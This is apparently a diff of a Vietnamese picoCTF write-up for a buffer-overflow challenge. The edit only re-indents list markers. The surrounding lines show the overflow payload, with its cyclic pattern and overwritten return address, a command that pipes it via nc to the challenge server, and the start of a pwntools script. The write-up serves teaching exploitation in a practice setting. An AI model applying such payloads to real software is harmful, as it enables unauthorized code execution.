@@ -101,9 +101,9 @@ c) Bước 3: Viết payload
 
 - Chúng ta có 2 cách để truyền payload bao gồm truyền bằng ống (pipe) và truyền bằng file thực thi
 - Cách 1: truyền bằng pipe:
-+ Payload:
+  + Payload:
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08
-+ Câu lệnh truyền payload bằng pipe:
+  + Câu lệnh truyền payload bằng pipe:
 
 ```cpp
 (echo -ne "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08"; cat) | nc saturn.picoctf.net 63395
@@ -112,7 +112,7 @@ Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab\xf6\x91\x04\x08
 ![image.png](image%206.png)
 
 - Cách 2: dùng file thực thi
-+ Ta tạo file python thực thi:
+  + Ta tạo file python thực thi:
 
 ```cpp
 from pwn import *
